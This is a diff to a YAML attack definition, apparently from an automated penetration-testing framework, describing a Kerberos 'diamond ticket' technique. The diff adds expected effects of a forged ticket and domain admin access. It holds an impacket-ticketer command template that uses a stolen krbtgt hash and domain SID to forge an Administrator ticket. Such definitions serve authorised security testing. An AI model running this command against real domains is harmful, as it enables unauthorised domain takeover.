@@ -1,15 +1,16 @@
 name: diamond_ticket
 category: ad
-description: Diamond ticket — modify legitimate TGT
+description: "Diamond ticket \u2014 modify legitimate TGT"
 preconditions:
 - domain_joined
 parameters:
   target_ip: from_engagement.target_ip
 command_template: impacket-ticketer -request -domain {domain} -user Administrator
   -password '{password}' -nthash '{krbtgt_hash}' -domain-sid '{sid}'
-parser: null
+parser: impacket_parser
 expected_effects:
-- action_completed
+- diamond_ticket_forged
+- domain_admin
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
